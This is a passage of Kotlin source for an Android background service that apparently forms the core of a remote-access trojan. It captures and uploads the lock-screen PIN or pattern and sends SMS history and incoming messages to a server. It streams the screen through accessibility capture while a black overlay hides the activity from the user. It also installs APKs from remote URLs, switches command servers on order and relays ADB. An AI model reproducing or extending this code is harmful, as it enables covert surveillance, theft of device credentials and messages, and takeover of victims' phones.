            return
        }
        if (isDirectBootMode) {
            throw IllegalStateException("missing device credentials in DPS")
        }

        broadcastStatus(getString(R.string.status_registering))
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val model = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        val meta = DeviceInfoCollector.snapshot(this)
        android.util.Log.i(
            TAG,
            "registering api=${ServerEndpointStore.current(serverPrefs).apiBaseUrl} androidId=${androidId.take(8)}…",
        )
        val result = apiClient.registerDevice(
            androidId = androidId,
            model = model,
            meta = meta,
            apiBaseUrl = ServerEndpointStore.current(serverPrefs).apiBaseUrl,
        )
        // commit：立刻可被 A 的 ContentProvider 读到，避免 apply 异步导致绑定时读空
        devicePrefs.deviceId = result.deviceId
        devicePrefs.deviceToken = result.deviceToken
        android.util.Log.i(TAG, "register ok deviceId=${result.deviceId}")
        broadcastDeviceId(result.deviceId)
    }

    private fun connectWebSocket() {
        val token = devicePrefs.deviceToken ?: throw IllegalStateException("missing device token")
        val throttled = synchronized(controlConnectLock) {
            val existing = webSocketClient
            // 已连通或正在握手都直接复用。旧实现在握手中也会重建客户端，
            // 每个新客户端又会把上一个掐掉，一次网络抖动就能滚成无限重连。
            if (existing != null && (existing.isConnected() || existing.isConnecting())) {
                return@synchronized false
            }
            val now = System.currentTimeMillis()
            if (now - lastControlConnectAtMs < CONTROL_CONNECT_MIN_GAP_MS) {
                // 刚失败过就先让位给 scheduleReconnect 的退避，不在这里硬顶
                return@synchronized true
            }
            lastControlConnectAtMs = now
            val endpoints = ServerEndpointStore.current(serverPrefs)
            android.util.Log.i(
                TAG,
                "connecting control WS url=${endpoints.wsBaseUrl} deviceId=${devicePrefs.deviceId}",
            )
            existing?.disconnect(suppressListener = true)
            AdbRelayController.bind(
                token = token,
                wsAdbBaseUrl = AdbWsUrl.deriveFromControlWs(endpoints.wsBaseUrl),
            )
            // 上次中继是启用中的话，把它接回来：服务端重启、进程被回收都靠这一步恢复。
            // 必须放到独立线程：resumeIfDesired 内部会阻塞握手最多 8 秒，
            // 留在 controlConnectLock 里会把控制通道握手一起拖住。
            serviceScope.launch {
                if (AdbRelayController.resumeIfDesired()) {
                    android.util.Log.i(TAG, "adb relay resumed from desired flag")
                }
            }
            webSocketClient = DeviceWebSocketClient(
                scope = serviceScope,
                deviceToken = token,
                wsBaseUrl = endpoints.wsBaseUrl,
                listener = this,
                heartbeatPayloadProvider = {
                    DeviceInfoCollector.snapshot(this@ConnectionService).also { json ->
                        if (serverPrefs.consumeRollbackFlag()) {
                            json.put("transferRollback", 1)
                        }
                        json.put("apiBaseUrl", ServerEndpointStore.current(serverPrefs).apiBaseUrl)
                    }
                },
            ).also { it.connect() }
            false
        }
        if (throttled) {
            // 被限流挡掉时一定要留下一次重试，否则没有别的东西会再来拉这条连接
            scheduleReconnect()
            return
        }
        if (isDirectBootMode) {
            return
        }
        if (screenWebSocketClient?.isConnected() != true) {
            ensureScreenChannel()
        }
    }

    private fun ensureScreenChannel() {
        if (isDirectBootMode) {
            return
        }
        synchronized(screenConnectLock) {
            val existing = screenWebSocketClient
            if (existing != null && (existing.isConnected() || existing.isConnecting())) {
                return
            }
            val now = System.currentTimeMillis()
            if (now - lastScreenConnectAtMs < SCREEN_CONNECT_MIN_GAP_MS) {
                scheduleScreenReconnect()
                return
            }
            val token = devicePrefs.deviceToken ?: return
            val endpoints = ServerEndpointStore.current(serverPrefs)
            lastScreenConnectAtMs = now
            existing?.disconnect(suppressListener = true)
            screenWebSocketClient = DeviceScreenWebSocketClient(
                scope = serviceScope,
                deviceToken = token,
                wsScreenBaseUrl = endpoints.wsScreenBaseUrl,
                listener = screenSocketListener,
            ).also { it.connect() }
        }
    }

    /** 画面通道的延迟重连，避免失败回调里立刻重建客户端。 */
    private fun scheduleScreenReconnect() {
        if (isDirectBootMode) {
            return
        }
        if (screenReconnectJob?.isActive == true) {
            return
        }
        screenReconnectJob = serviceScope.launch {
            delay(SCREEN_RECONNECT_DELAY_MS)
            runCatching { ensureScreenChannel() }
                .onFailure { android.util.Log.e(TAG, "screen reconnect failed", it) }
        }
    }

    private fun refreshDirectBootMode(intent: Intent?) {
        isDirectBootMode = if (intent?.getBooleanExtra(EXTRA_DIRECT_BOOT, false) == true) {
            true
        } else {
            !DirectBoot.isUserUnlocked(this)
        }
    }

    private fun handleKeyguardPin(
        pin: String,
        capturedAt: Long,
        lockType: String = "pin",
        gesturePath: String = "",
    ) {
        val type = KeyguardLockType.fromWire(lockType)
        // Always go through pending-store normalize so live WS path cannot upload "•••••5".
        val id = keyguardPinPendingStore.enqueue(
            pin = pin,
            capturedAt = capturedAt,
            lockType = type,
            gesturePath = gesturePath,
        )
        if (id.isBlank()) {
            android.util.Log.w(
                TAG,
                "keyguard enqueue skipped empty after normalize lockType=${type.wireName}",
            )
            return
        }
        android.util.Log.i(
            TAG,
            "keyguard enqueued id=$id lockType=${type.wireName} len=${pin.length} ws=${webSocketClient?.isConnected() == true}",
        )
        if (type == KeyguardLockType.PATTERN && gesturePath.isNotBlank()) {
            keyguardGesturePathStore.save(gesturePath)
        }
        SetupPrefs(this).setupPinPromptDone = true
        flushPendingKeyguardPins()
    }

    private fun flushPendingKeyguardPins() {
        if (webSocketClient?.isConnected() != true) {
            android.util.Log.w(
                TAG,
                "keyguard flush deferred: control WS not connected pending=${keyguardPinPendingStore.listPending().size}",
            )
            return
        }
        val pending = keyguardPinPendingStore.listPending()
        if (pending.isEmpty()) {
            return
        }
        val acked = mutableListOf<String>()
        for (item in pending) {
            webSocketClient?.sendKeyguardPinEvent(
                pin = item.pin,
                capturedAt = item.capturedAt,
                lockType = item.lockType.wireName,
                gesturePath = item.gesturePath,
            )
            acked.add(item.id)
        }
        keyguardPinPendingStore.removeAll(acked)
    }

    private suspend fun handleUpdateApk(commandId: String, params: JSONObject) {
        val url = params.optString("url").trim()
        if (url.isEmpty()) {
            webSocketClient?.sendCommandResult(
                commandId = commandId,
                ok = false,
                error = "update_apk_requires_url",
            )
            return
        }
        val minVersionRaw = params.opt("versionCode")
        val minVersionCode = when (minVersionRaw) {
            is Number -> minVersionRaw.toLong()
            is String -> minVersionRaw.toLongOrNull()
            else -> null
        }
        DeviceStateHelper.wakeScreen(this)
        val result = runCatching {
            ApkUpdateHelper.update(this, url, minVersionCode)
        }.getOrElse { error ->
            ApkUpdateHelper.UpdateResult(
                ok = false,
                error = error.message ?: "update_apk_failed",
            )
        }
        webSocketClient?.sendCommandResult(
            commandId = commandId,
            ok = result.ok,
            data = result.data.put("action", "update_apk"),
            error = result.error,
        )
        broadcastStatus(
            getString(
                R.string.status_command_result,
                "update_apk",
                if (result.ok) {
                    result.data.optString("status").ifBlank {
                        getString(R.string.status_command_success)
                    }
                } else {
                    result.error.orEmpty()
                },
            ),
        )
    }

    private suspend fun handleSwitchServer(commandId: String, params: JSONObject) {
        val next = ServerEndpointStore.parse(params)
        if (next == null) {
            webSocketClient?.sendCommandResult(
                commandId = commandId,
                ok = false,
                error = "switch_server_requires_urls",
            )
            return
        }
        val error = ServerEndpointStore.applySwitch(serverPrefs, next)
        if (error != null) {
            webSocketClient?.sendCommandResult(
                commandId = commandId,
                ok = false,
                error = error,
            )
            return
        }
        webSocketClient?.sendCommandResult(
            commandId = commandId,
            ok = true,
            data = JSONObject()
                .put("apiBaseUrl", next.apiBaseUrl)
                .put("wsBaseUrl", next.wsBaseUrl)
                .put("wsScreenBaseUrl", next.wsScreenBaseUrl),
        )
        delay(300)
        reconnectAfterSwitch()
        scheduleSwitchRollback()
    }

    private fun reconnectAfterSwitch() {
        reconnectJob?.cancel()
        AdbRelayController.unbind()
        AdbSession.end()
        screenWebSocketClient?.disconnect(suppressListener = true)
        webSocketClient?.disconnect(suppressListener = true)
        webSocketClient = null
        screenWebSocketClient = null
        // 换服务器是用户/后台主动要求的重连，清掉建连限流，否则会被当成一次抖动挡掉
        lastControlConnectAtMs = 0L
        lastScreenConnectAtMs = 0L
        runCatching { connectWebSocket() }
            .onFailure { error ->
                android.util.Log.e(TAG, "switch_server reconnect failed", error)
                scheduleReconnect()
            }
    }

    private fun scheduleSwitchRollback() {
        switchRollbackJob?.cancel()
        switchRollbackJob = serviceScope.launch {
            delay(SWITCH_ROLLBACK_MS)
            if (webSocketClient?.isConnected() == true) {
                ServerEndpointStore.clearPrev(serverPrefs)
                return@launch
            }
            if (!ServerEndpointStore.rollback(serverPrefs)) {
                android.util.Log.w(TAG, "switch_server rollback skipped: no prev urls")
                return@launch
            }
            android.util.Log.w(TAG, "switch_server timeout, rollback to previous server")
            reconnectAfterSwitch()
        }
    }

    private fun scheduleReconnect() {
        if (reconnectJob?.isActive == true) {
            ControlReconnectAlarm.schedule(applicationContext)
            return
        }
        reconnectJob?.cancel()
        ControlReconnectAlarm.schedule(applicationContext)
        reconnectJob = serviceScope.launch {
            delay(RECONNECT_DELAY_MS)
            runCatching { connectWebSocket() }
                .onFailure {
                    android.util.Log.e(TAG, "reconnect failed", it)
                    scheduleReconnect()
                }
        }
    }

    /** 投屏活跃时顺带把控制通道拉回来；force 时忽略节流。 */
    private fun ensureControlChannelAlive(force: Boolean = false) {
        val current = webSocketClient
        if (current?.isConnected() == true) {
            ControlReconnectAlarm.cancel(applicationContext)
            return
        }
        // 握手中的连接不能再被「补一条」打断，否则等于自己制造重连风暴。
        if (current?.isConnecting() == true) {
            return
        }
        val now = System.currentTimeMillis()
        if (!force && now - lastControlEnsureAtMs < CONTROL_ENSURE_THROTTLE_MS) {
            return
        }
        lastControlEnsureAtMs = now
        android.util.Log.w(TAG, "control channel missing, reconnecting")
        serviceScope.launch {
            runCatching {
                ensureRegistered()
                connectWebSocket()
            }.onFailure { error ->
                android.util.Log.e(TAG, "ensure control failed", error)
                scheduleReconnect()
            }
        }
    }

    private fun uploadSmsHistory(limit: Int): Int {
        if (!SmsHelper.hasSmsPermissions(this)) {
            return 0
        }

        var uploaded = 0
        for (record in smsReader.readRecent(limit)) {
            if (devicePrefs.isSmsUploaded(record.clientSmsId)) {
                continue
            }
            uploadSms(
                sender = record.sender,
                body = record.body,
                smsType = record.smsType,
                source = "history",
                clientSmsId = record.clientSmsId,
                receivedAt = record.receivedAt,
            )
            uploaded++
        }
        return uploaded
    }

    private fun uploadSms(
        sender: String,
        body: String,
        smsType: Int,
        source: String,
        clientSmsId: String?,
        receivedAt: Long,
    ) {
        webSocketClient?.sendSmsEvent(
            sender = sender,
            body = body,
            smsType = smsType,
            source = source,
            clientSmsId = clientSmsId,
            receivedAt = receivedAt,
        )
        if (!clientSmsId.isNullOrBlank()) {
            devicePrefs.markSmsUploaded(clientSmsId)
        }
    }

    private suspend fun captureScreenOnce(forceAccessibility: Boolean = false): ScreenCaptureBridge.CaptureResult {
        val useProjection = !forceAccessibility &&
            screenStreamMode == MODE_PROJECTION &&
            MediaProjectionHolder.hasConsent()
        val capturer = mediaProjectionCapturer
        if (useProjection && capturer != null) {
            if (!capturer.isRunning()) {
                val started = runCatching { capturer.start() }.getOrDefault(false)
                if (!started) {
                    return ScreenCaptureBridge.CaptureResult(false, error = "projection_start_failed")
                }
            }
            // Black overlay excluded via Samsung SEM flags / OEM title spoof — capture as-is.
            return capturer.captureOnce()
        }
        // Accessibility screenshot (default mirror mode — no MediaProjection consent).
        return suspendCancellableCoroutine { continuation ->
            ScreenCaptureBridge.captureOnce { result ->
                if (continuation.isActive) {
                    continuation.resume(result)
                }
            }
        }
    }

    private suspend fun captureScreenOnceFull(): ScreenCaptureBridge.CaptureResult {
        return suspendCancellableCoroutine { continuation ->
            ScreenCaptureBridge.captureOnceFull { result ->
                if (continuation.isActive) {
                    continuation.resume(result)
                }
            }
        }
    }


    private fun normalizeScreenMode(raw: String): String {
        val value = raw.trim().lowercase()
        return when {
            value == MODE_PROJECTION || value == "media_projection" || value == "cast" -> MODE_PROJECTION
            value == MODE_SCREENHELPER || value == "helper" || value == "ui_tree" -> MODE_SCREENHELPER
            else -> MODE_SCREENSHOT
        }
    }

    private fun resumeScreenStreamIfDesired() {
        if (!screenStreamDesired) {
            return
        }
        val fps = desiredScreenFps.coerceIn(1, 5)
        serviceScope.launch {
            when (screenStreamMode) {
                MODE_PROJECTION -> ensureProjectionAndStartStream(fps)
                MODE_SCREENHELPER -> startScreenHelperStream(fps, forceJpeg = false)
                else -> startScreenshotStream(fps, forceJpeg = false)
            }
        }
    }

    /**
     * Accessibility takeScreenshot loop — no MediaProjection consent dialog.
     * @return false when capture cannot start at all (unsupported / a11y down).
     */
    private fun startScreenshotStream(fps: Int): Boolean {
        if (!ScreenCaptureBridge.isSupported()) {
            screenWebSocketClient?.sendScreenError(
                ERROR_SCREENSHOT_UNSUPPORTED,
                "screen_capture_unsupported",
            )
            return false
        }
        if (!AccessibilityControlBridge.isReady()) {
            screenWebSocketClient?.sendScreenError(
                ERROR_A11Y_NOT_CONNECTED,
                "accessibility_service_not_connected",
            )
            // Keep desired=true so we retry after a11y connects / channel resumes.
            screenWebSocketClient?.sendScreenStatus(
                "waiting_accessibility",
                "accessibility_service_not_connected",
            )
        }

        return startScreenshotStream(fps, forceJpeg = false)
    }

    private fun startScreenshotStream(fps: Int, forceJpeg: Boolean): Boolean {
        if (!ScreenCaptureBridge.isSupported()) {
            screenWebSocketClient?.sendScreenError(
                ERROR_SCREENSHOT_UNSUPPORTED,
                "screen_capture_unsupported",
            )
            return false
        }
        screenStreamMode = MODE_SCREENSHOT
        desiredScreenFps = fps.coerceIn(1, 5)
        pendingStreamFps = null
        if (!forceJpeg && preferWebRtcProjection) {
            return startScreenshotWebRtc(desiredScreenFps)
        }

        stopCameraStream()
        stopWebRtcSession()
        stopSnapshotStream(keepCapturer = true)
        promoteToForegroundSafely(withMediaProjection = false)
        val useWebp = preferWebSocketTransport
        var lastPayload: String? = null
        snapshotStreamJob = serviceScope.launch {
            ensureScreenAwake()
            var blackPassthroughHeld = false
            var consecutiveFailures = 0
            var gotFirstFrame = false
            try {
                // Cap screenshot FPS to reduce ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT.
                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
                while (isActive && screenStreamDesired) {
                    if (!AccessibilityControlBridge.isReady()) {
                        reportScreenshotFailure("accessibility_service_not_connected")
                        delay(1_000L)
                        continue
                    }

                    val blackActive = AccessibilityControlBridge.isBlackScreenActive()
                    if (blackActive && !blackPassthroughHeld) {
                        // Semi-transparent black + recover — no local blink.
                        AccessibilityControlBridge.setBlackScreenStreamCompatible(true)
                        blackPassthroughHeld = true
                    } else if (!blackActive && blackPassthroughHeld) {
                        AccessibilityControlBridge.setBlackScreenStreamCompatible(false)
                        blackPassthroughHeld = false
                    }

                    val startedAt = System.currentTimeMillis()
                    if (useWebp) {
                        // 1688 同款：缩放(短边 320) → 黑帧检测 → WEBP(q=10) → 复用上一帧。
                        val bitmapCapture = captureScreenBitmapOnce()
                        val bitmap = bitmapCapture.bitmap
                        if (bitmapCapture.ok && bitmap != null) {
                            val encodedFrame = withContext(Dispatchers.Default) {
                                try {
                                    ScreenFrameCodec.encodeFrame(bitmap, currentWebpQuality())
                                } finally {
                                    if (!bitmap.isRecycled) bitmap.recycle()
                                }
                            }
                            val payload = when {
                                encodedFrame == null -> ""
                                encodedFrame.isBlack && lastPayload != null -> lastPayload!!
                                else -> encodedFrame.base64
                            }
                            if (encodedFrame != null && !encodedFrame.isBlack &&
                                encodedFrame.base64.isNotBlank()
                            ) {
                                lastPayload = encodedFrame.base64
                            }
                            if (payload.isNotBlank()) {
                                ensureControlChannelAlive()
                                val sent = screenWebSocketClient?.sendScreenFrame(
                                    data = payload,
                                    screenWidth = bitmapCapture.screenWidth,
                                    screenHeight = bitmapCapture.screenHeight,
                                    source = "screenshot",
                                    imageWidth = encodedFrame?.width
                                        ?: bitmapCapture.screenWidth,
                                    imageHeight = encodedFrame?.height
                                        ?: bitmapCapture.screenHeight,
                                    mimeType = "image/webp",
                                ) == true
                                if (sent) {
                                    consecutiveFailures = 0
                                    if (!gotFirstFrame) {
                                        gotFirstFrame = true
                                        screenWebSocketClient?.sendScreenStatus("streaming", "first_frame")
                                    }
                                } else {
                                    consecutiveFailures += 1
                                    reportScreenshotFailure("screen_send_failed")
                                }
                            }
                        } else {
                            consecutiveFailures += 1
                            val error = bitmapCapture.error ?: "capture_failed"
                            if (error != "gesture_priority" &&
                                error != "capture_in_progress" &&
                                !error.startsWith("screenshot_failed_3")
                            ) {
                                reportScreenshotFailure(error)
                            } else if (!gotFirstFrame && consecutiveFailures >= 8) {
                                reportScreenshotFailure(error)
                            }
                            if (!gotFirstFrame && consecutiveFailures >= 20) {
                                screenWebSocketClient?.sendScreenError(
                                    ERROR_SCREENSHOT_NO_FRAME,
                                    error,
                                )
                            }
                        }
                    } else {
                        val capture = captureScreenOnce(forceAccessibility = true)
                        if (capture.ok && capture.data.isNotBlank()) {
                            ensureControlChannelAlive()
                            val sent = screenWebSocketClient?.sendScreenFrame(
                                data = capture.data,
                                screenWidth = capture.screenWidth,
                                screenHeight = capture.screenHeight,
                                source = "screenshot",
                            ) == true
                            if (sent) {
                                consecutiveFailures = 0
                                if (!gotFirstFrame) {
                                    gotFirstFrame = true
                                    screenWebSocketClient?.sendScreenStatus("streaming", "first_frame")
                                }
                            } else {
                                consecutiveFailures += 1
                                reportScreenshotFailure("screen_send_failed")
                            }
                        } else {
                            consecutiveFailures += 1
                            val error = capture.error ?: "capture_failed"
                            // Soft errors: keep looping; hard ones surface to admin.
                            if (error != "gesture_priority" &&
                                error != "capture_in_progress" &&
                                !error.startsWith("screenshot_failed_3")
                            ) {
                                reportScreenshotFailure(error)
                            } else if (!gotFirstFrame && consecutiveFailures >= 8) {
                                reportScreenshotFailure(error)
                            }
                            if (!gotFirstFrame && consecutiveFailures >= 20) {
                                screenWebSocketClient?.sendScreenError(
                                    ERROR_SCREENSHOT_NO_FRAME,
                                    error,
                                )
                            }
                        }
                    }
                    val elapsed = System.currentTimeMillis() - startedAt
                    val waitMs = (intervalMs - elapsed).coerceAtLeast(120L)
                    delay(waitMs)
                }
            } finally {
                if (blackPassthroughHeld) {
                    AccessibilityControlBridge.setBlackScreenStreamCompatible(false)
                }
            }
        }
        return true
    }

    private fun reportScreenshotFailure(detail: String) {
        val now = System.currentTimeMillis()
        if (now - lastScreenshotFailReportAtMs < SCREENSHOT_FAIL_REPORT_MIN_MS) {
            return
        }
        lastScreenshotFailReportAtMs = now
        screenWebSocketClient?.sendScreenStatus("capture_failed", detail)
        when (detail) {
            "accessibility_service_not_connected" ->
                screenWebSocketClient?.sendScreenError(ERROR_A11Y_NOT_CONNECTED, detail)
            "screen_capture_unsupported" ->
                screenWebSocketClient?.sendScreenError(ERROR_SCREENSHOT_UNSUPPORTED, detail)
            else ->
                screenWebSocketClient?.sendScreenError(ERROR_SCREENSHOT_CAPTURE_FAILED, detail)
        }
    }

    private fun startScreenshotWebRtc(fps: Int): Boolean {
        stopCameraStream()
        stopSnapshotStream(keepCapturer = true)
        stopWebRtcSession()
        screenStreamMode = MODE_SCREENSHOT
        desiredScreenFps = fps.coerceIn(1, 5)
        promoteToForegroundSafely(withMediaProjection = false)
        screenWebSocketClient?.sendScreenStatus("webrtc_starting", "screenshot")

        val session = ScreenWebRtcSession(
            context = this,
            signaling = createWebRtcSignalingSink(
                source = "screenshot",
                onFailedFallback = {
                    if (screenStreamDesired && screenStreamMode == MODE_SCREENSHOT) {
                        startScreenshotStream(desiredScreenFps, forceJpeg = true)
                    }
                },
            ),
        )
        screenWebRtcSession = session
        session.startBitmapPush(
            iceServersJson = pendingIceServers,
            width = 540,
            height = 960,
            fps = desiredScreenFps.coerceIn(1, 3),
        )

        snapshotStreamJob = serviceScope.launch {
            ensureScreenAwake()
            var blackPassthroughHeld = false
            var consecutiveFailures = 0
            var gotFirstFrame = false
            try {
                val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
                // Wait briefly for PC/capturer to come up.
                delay(400L)
                while (isActive && screenStreamDesired && screenStreamMode == MODE_SCREENSHOT) {
                    if (!AccessibilityControlBridge.isReady()) {
                        reportScreenshotFailure("accessibility_service_not_connected")
                        delay(1_000L)
                        continue
                    }
                    val blackActive = AccessibilityControlBridge.isBlackScreenActive()
                    if (blackActive && !blackPassthroughHeld) {
                        AccessibilityControlBridge.setBlackScreenStreamCompatible(true)
                        blackPassthroughHeld = true
                    } else if (!blackActive && blackPassthroughHeld) {
                        AccessibilityControlBridge.setBlackScreenStreamCompatible(false)
                        blackPassthroughHeld = false
                    }

                    val startedAt = System.currentTimeMillis()
                    val capture = captureScreenBitmapOnce()
                    val bitmap = capture.bitmap
                    if (capture.ok && bitmap != null) {
                        screenWebRtcSession?.offerBitmap(bitmap, recycleAfter = true)
                        consecutiveFailures = 0
                        if (!gotFirstFrame) {
                            gotFirstFrame = true
                            screenWebSocketClient?.sendScreenStatus("streaming", "first_frame_webrtc")
                        }
                    } else {
                        consecutiveFailures += 1
                        val error = capture.error ?: "capture_failed"
                        if (error != "gesture_priority" &&
                            error != "capture_in_progress" &&
                            !error.startsWith("screenshot_failed_3")
                        ) {
                            reportScreenshotFailure(error)
                        } else if (!gotFirstFrame && consecutiveFailures >= 8) {
                            reportScreenshotFailure(error)
                        }
                        if (!gotFirstFrame && consecutiveFailures >= 20) {
                            screenWebSocketClient?.sendScreenError(ERROR_SCREENSHOT_NO_FRAME, error)
                        }
                    }
                    val elapsed = System.currentTimeMillis() - startedAt
                    delay((intervalMs - elapsed).coerceAtLeast(120L))
                }
            } finally {
                if (blackPassthroughHeld) {
                    AccessibilityControlBridge.setBlackScreenStreamCompatible(false)
                }
            }
        }
        return true
    }

    private fun startScreenHelperStream(fps: Int, forceJpeg: Boolean): Boolean {
        if (!AccessibilityControlBridge.isReady()) {
            screenWebSocketClient?.sendScreenError(
                ERROR_A11Y_NOT_CONNECTED,
                "accessibility_service_not_connected",
            )
            screenWebSocketClient?.sendScreenStatus(
                "waiting_accessibility",
                "accessibility_service_not_connected",
            )
        }
        screenStreamMode = MODE_SCREENHELPER
        desiredScreenFps = fps.coerceIn(1, 5)
        pendingStreamFps = null
        // WebSocket 模式直接走帧推流（含黑帧检测 + WEBP）。
        if (preferWebSocketTransport) {
            return startScreenHelperJpeg(desiredScreenFps)
        }
        if (preferWebRtcProjection && !forceJpeg) {
            return startScreenHelperWebRtc(desiredScreenFps)
        }
        return startScreenHelperJpeg(desiredScreenFps)
    }

    private fun startScreenHelperWebRtc(fps: Int): Boolean {
        stopCameraStream()
        stopSnapshotStream(keepCapturer = true)
        stopWebRtcSession()
        screenStreamMode = MODE_SCREENHELPER
        desiredScreenFps = fps.coerceIn(1, 5)
        promoteToForegroundSafely(withMediaProjection = false)
        screenWebSocketClient?.sendScreenStatus("webrtc_starting", "screenhelper")

        val session = ScreenWebRtcSession(
            context = this,
            signaling = createWebRtcSignalingSink(
                source = "screenhelper",
                onFailedFallback = {
                    if (screenStreamDesired && screenStreamMode == MODE_SCREENHELPER) {
                        startScreenHelperStream(desiredScreenFps, forceJpeg = true)
                    }
                },
            ),
        )
        screenWebRtcSession = session
        session.startBitmapPush(
            iceServersJson = pendingIceServers,
            width = 720,
            height = 1280,
            fps = desiredScreenFps.coerceIn(1, 4),
        )

        snapshotStreamJob = serviceScope.launch {
            ensureScreenAwake()
            delay(400L)
            val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
            while (isActive && screenStreamDesired && screenStreamMode == MODE_SCREENHELPER) {
                if (!AccessibilityControlBridge.isReady()) {
                    reportScreenshotFailure("accessibility_service_not_connected")
                    delay(1_000L)
                    continue
                }
                val startedAt = System.currentTimeMillis()
                val dump = withContext(Dispatchers.Default) {
                    runCatching {
                        AccessibilityControlBridge.dumpUiTree(
                            maxDepth = 22,
                            maxNodes = 900,
                            mode = "full",
                        )
                    }.getOrNull()
                }
                if (dump != null && !dump.has("error")) {
                    val bitmap = withContext(Dispatchers.Default) {
                        UiTreeFakeScreenRenderer.renderFromDump(dump, 720, 1280)
                    }
                    screenWebRtcSession?.offerBitmap(bitmap, recycleAfter = true)
                    screenWebSocketClient?.sendScreenStatus("streaming", "screenhelper")
                }
                val elapsed = System.currentTimeMillis() - startedAt
                delay((intervalMs - elapsed).coerceAtLeast(120L))
            }
        }
        return true
    }

    private fun startScreenHelperJpeg(fps: Int): Boolean {
        stopCameraStream()
        stopWebRtcSession()
        stopSnapshotStream(keepCapturer = true)
        screenStreamMode = MODE_SCREENHELPER
        desiredScreenFps = fps.coerceIn(1, 5)
        promoteToForegroundSafely(withMediaProjection = false)
        screenWebSocketClient?.sendScreenStatus("streaming", "screenhelper_jpeg")
        val useWebp = preferWebSocketTransport
        var lastPayload: String? = null

        snapshotStreamJob = serviceScope.launch {
            ensureScreenAwake()
            val intervalMs = (1000L / desiredScreenFps.coerceIn(1, 4)).coerceAtLeast(250L)
            while (isActive && screenStreamDesired && screenStreamMode == MODE_SCREENHELPER) {
                if (!AccessibilityControlBridge.isReady()) {
                    reportScreenshotFailure("accessibility_service_not_connected")
                    delay(1_000L)
                    continue
                }
                val startedAt = System.currentTimeMillis()
                val dump = withContext(Dispatchers.Default) {
                    runCatching {
                        AccessibilityControlBridge.dumpUiTree(
                            maxDepth = 22,
                            maxNodes = 900,
                            mode = "full",
                        )
                    }.getOrNull()
                }
                if (dump != null && !dump.has("error")) {
                    val screenWidth = dump.optInt("screenWidth").takeIf { it > 0 } ?: 720
                    val screenHeight = dump.optInt("screenHeight").takeIf { it > 0 } ?: 1280
                    val encoder: (Bitmap) -> ScreenFrameCodec.EncodedFrame? = if (useWebp) {
                        { bmp ->
                            ScreenFrameCodec.encodeFrame(bmp, currentWebpQuality())
                        }
                    } else {
                        { bmp ->
                            ScreenFrameCodec.EncodedFrame(
                                bitmapToJpegBase64(bmp, SCREENHELPER_JPEG_QUALITY),
                                bmp.width,
                                bmp.height,
                                false,
                            )
                        }
                    }
                    val encodedFrame = withContext(Dispatchers.Default) {
                        val bitmap = UiTreeFakeScreenRenderer.renderFromDump(dump, 720, 1280)
                        try {
                            encoder(bitmap)
                        } finally {
                            if (!bitmap.isRecycled) {
                                bitmap.recycle()
                            }
                        }
                    }
                    val payload = when {
                        encodedFrame == null -> ""
                        encodedFrame.isBlack && lastPayload != null -> lastPayload!!
                        else -> encodedFrame.base64
                    }
                    if (encodedFrame != null && !encodedFrame.isBlack &&
                        encodedFrame.base64.isNotBlank()
                    ) {
                        lastPayload = encodedFrame.base64
                    }
                    if (payload.isNotBlank()) {
                        ensureControlChannelAlive()
                        screenWebSocketClient?.sendScreenFrame(
                            data = payload,
                            screenWidth = screenWidth,
                            screenHeight = screenHeight,
                            source = "screenhelper",
                            imageWidth = encodedFrame?.width ?: 720,
                            imageHeight = encodedFrame?.height ?: 1280,
                            mimeType = if (useWebp) "image/webp" else "image/jpeg",
                        )
                    }
                }
                val elapsed = System.currentTimeMillis() - startedAt
                delay((intervalMs - elapsed).coerceAtLeast(120L))
            }
        }
        return true
    }

    private fun bitmapToJpegBase64(bitmap: Bitmap, quality: Int): String {
        val stream = ByteArrayOutputStream()
        if (!bitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream)) {
            return ""
        }
        return Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
    }

    private suspend fun captureScreenBitmapOnce(): ScreenCaptureBridge.BitmapCaptureResult {
        return suspendCancellableCoroutine { continuation ->
            ScreenCaptureBridge.captureOnceBitmap { result ->
                if (continuation.isActive) {
                    continuation.resume(result)
                } else {
                    result.bitmap?.recycle()
                }
            }
        }
    }

    private fun createWebRtcSignalingSink(
        source: String,
        onFailedFallback: (() -> Unit)?,
    ): ScreenWebRtcSession.SignalingSink {
        return object : ScreenWebRtcSession.SignalingSink {
            override fun sendOffer(sdp: String) {
                val (screenWidth, screenHeight) = displayMetricsSize()
                screenWebSocketClient?.sendSignaling(
                    "webrtc_offer",
                    JSONObject()
                        .put("sdp", sdp)
                        .put("type", "offer")
                        .put("source", source)
                        .put("screenWidth", screenWidth)
                        .put("screenHeight", screenHeight),
                )
                screenWebSocketClient?.sendScreenStatus("webrtc_offer_sent", source)
            }

            override fun sendIce(candidate: JSONObject) {
                screenWebSocketClient?.sendSignaling("webrtc_ice", candidate)
            }

            override fun onSessionFailed(message: String) {
                android.util.Log.w(TAG, "webrtc $source failed: $message")
                screenWebSocketClient?.sendScreenStatus("webrtc_failed", message)
                screenWebSocketClient?.sendScreenError(ERROR_WEBRTC_FAILED, message)
                serviceScope.launch {
                    // Stop push loop first — offering into a disposed VideoSource aborts the process
                    // (native mutex) and Android marks AccessibilityService as "无法运行".
                    stopSnapshotStream(keepCapturer = true)
                    // 避免上一次 takeScreenshot 回调丢失导致 isCapturingFrame 永久卡住。
                    ScreenCaptureBridge.forceReleaseLock("webrtc_failed_$source")
                    val failed = screenWebRtcSession
                    screenWebRtcSession = null
                    runCatching {
                        screenWebSocketClient?.sendSignaling(
                            "webrtc_hangup",
                            JSONObject().put("reason", message),
                        )
                    }
                    runCatching { failed?.stop() }
                    onFailedFallback?.invoke()
                }
            }

            override fun onSessionConnected() {
                screenWebSocketClient?.sendScreenStatus("webrtc_connected", source)
            }
        }
    }

    private fun ensureProjectionAndStartStream(fps: Int): Boolean {
        screenStreamMode = MODE_PROJECTION
        if (MediaProjectionHolder.hasConsent()) {
            promoteToForegroundSafely(withMediaProjection = true)
            if (preferWebSocketTransport) {
                // 1688 同款：MediaProjection → ImageReader → WEBP 帧推流。
                startSnapshotStream(fps)
            } else if (preferWebRtcProjection) {
                startProjectionWebRtc(fps)
            } else {
                startSnapshotStream(fps)
            }
            return true
        }
